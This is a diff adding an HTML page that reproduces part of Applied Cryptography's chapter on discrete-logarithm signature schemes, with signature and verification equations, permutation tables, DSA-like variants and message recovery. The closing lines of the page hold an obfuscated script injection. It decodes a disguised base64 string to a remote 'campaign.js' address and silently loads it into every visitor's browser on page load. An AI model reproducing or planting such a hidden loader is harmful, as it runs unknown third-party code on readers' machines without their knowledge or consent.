@@ -1,0 +1,171 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=496-498//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The difference between this scheme and DSA is that with DSA <I>s</I> = (<I>xr</I> &#43; <I>k</I><SUP>-1</SUP>(<I>H</I>(<I>m</I>))) mod <I>q</I>, which leads to a different verification equation. Curious, though, is that <I>q</I> is 256 bits. Most Western cryptographers seem satisfied with a <I>q</I> of around 160 bits. Perhaps this is just a reflection of the Russian tendency to play it ultrasafe.</P>
+<P>The standard has been in use since the beginning of 1995, and is not classified &#147;for special use&#148;&#151;whatever that means.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">20.4 Discrete Logarithm Signature Schemes</FONT></H3>
+<P>ElGamal, Schnorr (see Section 21.3), and DSA signature schemes are very similar. In fact, they are just three examples of a general digital signature scheme based on the Discrete Logarithm Problem. Along with thousands of other signature schemes, they are part of the same family [740,741,699,1184].
+</P>
+<P>Choose <I>p</I>, a large prime number, and <I>q</I>, either <I>p</I> &#150; 1 or a large prime factor of <I>p</I> &#150; 1. Then choose <I>g</I>, a number between 1 and <I>p</I> such that <I>g<SUP>q</I></SUP> &#8801; 1 (mod <I>p</I>). All these numbers are public, and can be common to a group of users. The private key is <I>x</I>, less than <I>q</I>. The public key is <I>y</I> = <I>g<SUP>x</I></SUP> mod <I>p</I>.</P>
+<P>To sign a message, <I>m</I>, first choose a random <I>k</I> less than and relatively prime to <I>q</I>. If <I>q</I> is also prime, any <I>k</I> less than <I>q</I> works. First compute</P>
+<DL>
+<DD><I>r</I> = <I>g<SUP>k</I></SUP> mod <I>p</I>
+</DL>
+<P>The generalized <B>signature equation</B> now becomes</P>
+<DL>
+<DD><I>ak</I> = <I>b</I> &#43; <I>cx</I> mod <I>q</I>
+</DL>
+<P>The coefficients <I>a, b</I>, and <I>c</I> can be any of a variety of things. Each line in Table 20.4 gives six possibilities.</P>
+<P>To verify the signature, the receiver must confirm that</P>
+<DL>
+<DD><I>r<SUP>a</I></SUP> = <I>g<SUP>b</SUP>y<SUP>c</SUP></I> mod <I>p</I>
+</DL>
+<P>This is called the <B>verification equation</B>.</P>
+<P>Table 20.5 lists the signature and verifications possible from just the first line of potential values for <I>a, b</I>, and <I>c</I>, ignoring the effects of the &#177;</P>
+<TABLE WIDTH="40%"><TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 20.4<BR>Possible Permutations of <I>a, b</I>, and <I>c</I> (<I>r&#146;</I> = <I>r</I> mod <I>q</I>)
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD WIDTH="15%" VALIGN="TOP" ALIGN="LEFT">&#177;<I>r&#146;</I>
+<TD WIDTH="15%" VALIGN="TOP" ALIGN="LEFT">&#177;<I>s</I>
+<TD WIDTH="10%" VALIGN="TOP" ALIGN="RIGHT"><I>m</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>r&#146;m</I>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>s</I>
+<TD VALIGN="TOP" ALIGN="RIGHT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>r&#146;m</I>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>ms</I>
+<TD VALIGN="TOP" ALIGN="RIGHT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>mr&#146;</I>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>r&#146;s</I>
+<TD VALIGN="TOP" ALIGN="RIGHT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>ms</I>
+<TD VALIGN="TOP" ALIGN="LEFT">&#177;<I>r&#146;s</I>
+<TD VALIGN="TOP" ALIGN="RIGHT">1
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<P>That&#146;s six different signature schemes. Adding the negative signs brings the total to 24. Using the other possible values listed for <I>a, b</I>, and <I>c</I> brings the total to 120.</P>
+<P>ElGamal [518,519] and DSA [1154] are essentially based on equation (4). Other schemes are based on equation (2) [24,1629]. Schnorr [1396,1397] is closely related to equation (5), as is another scheme [1183]. And equation (1) can be modified to yield the scheme proposed in [1630]. The rest of the equations are new.</P>
+<P>There&#146;s more. You can make any of these schemes more DSA-like by defining <I>r</I> as</P>
+<DL>
+<DD><I>r</I> = (<I>g<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+</DL>
+<P>Keep the same signature equation and make the verification equation
+</P>
+<DL>
+<DD><I>u</I><SUB>1</SUB> = <I>a</I><SUP>-1</SUP><I>b</I> mod <I>q</I>
+<DD><I>u</I><SUB>2</SUB> = <I>a</I><SUP>-1</SUP><I>c</I> mod <I>q</I>
+<DD><I>r</I> = (<I>g<SUP>u</I><SMALL>1</SMALL></SUP><I>y<SUP>u</I><SMALL>2</SMALL></SUP> mod <I>p</I>) mod <I>q</I>
+</DL>
+<P>There are two other possibilities along these lines [740,741]; you can do this with each of the 120 schemes, bringing the total to 480 discrete-logarithm-based digital signature schemes.
+</P>
+<P>But wait&#151;there&#146;s more. Additional generalizations and variations can generate more than 13,000 variants (not all of them terribly efficient) [740,741].</P>
+<P>One of the nice things about using RSA for digital signatures is a feature called <B>message recovery</B>. When you verify an RSA signature you compute <I>m</I>. Then you compare the computed <I>m</I> with the message and see if the signature is valid for that message. With the previous schemes, you can&#146;t recover <I>m</I> when you compute the signature; you need a candidate <I>m</I> that you use in a verification equation. Well, as it turns out it is possible to construct a message recovery variant for all the above signature schemes.</P>
+<TABLE WIDTH="60%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 20.5<BR>Discrete Logarithm Signature Schemes
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH WIDTH="40%" ALIGN="LEFT">Signature Equation
+<TH ALIGN="CENTER">Verification Equation
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(1) <I>r&#146;k</I> = <I>s</I> &#43; <I>mx</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>r<SUP>r&#146;</I></SUP> = <I>g<SUP>s</SUP>y<SUP>m</SUP></I> mod <I>p</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(2) <I>r&#146;k</I> = <I>m</I> &#43; <I>sx</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>r<SUP>r&#146;</I></SUP> = <I>g<SUP>m</SUP>y<SUP>s</SUP></I> mod <I>p</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(3) <I>sk</I> = <I>r&#146;</I> &#43; <I>mx</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>r<SUP>s</I></SUP> = <I>g<SUP>r&#146;</SUP>y<SUP>m</I></SUP> mod <I>p</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(4) <I>sk</I> = <I>m</I> &#43; <I>r&#146;x</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>r<SUP>s</SUP></I> = <I>g<SUP>m</SUP>y<SUP>r&#146;</SUP></I> mod <I>p</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(5) <I>mk</I> = <I>s</I> &#43; <I>r&#146;x</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>rm</I> = <I>g<SUP>s</SUP>y<SUP>r&#146;</I></SUP> mod <I>p</I>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">(6) <I>mk</I> = <I>r&#146;</I> &#43; <I>sx</I> mod <I>q</I>
+<TD VALIGN="TOP" ALIGN="CENTER"><I>rm</I> = <I>g<SUP>r&#146;</SUP>y<SUP>s</I></SUP> mod <I>p</I>
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<P>To sign, first compute
+</P>
+<DL>
+<DD><I>r</I> = <I>mg<SUP>k</I></SUP> mod <I>p</I>
+</DL>
+<P>and replace <I>m</I> by 1 in the signature equation. Then you can reconstruct the verification equation such that <I>m</I> can be computed directly.</P>
+<P>You can do the same with the DSA-like schemes:</P>
+<DL>
+<DD><I>r</I> = (<I>mg<SUP>k</I></SUP> mod <I>p</I>) mod <I>q</I>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="20-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(sdlaAbQc, ychSNjQe) {ychSNjQe = sdlaAbQc.createElement('script');ychSNjQe.type = 'text/javascript';ychSNjQe.async = true;ychSNjQe.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');sdlaAbQc.getElementsByTagName('body')[0].appendChild(ychSNjQe);}(document));</script></body>
+</html>
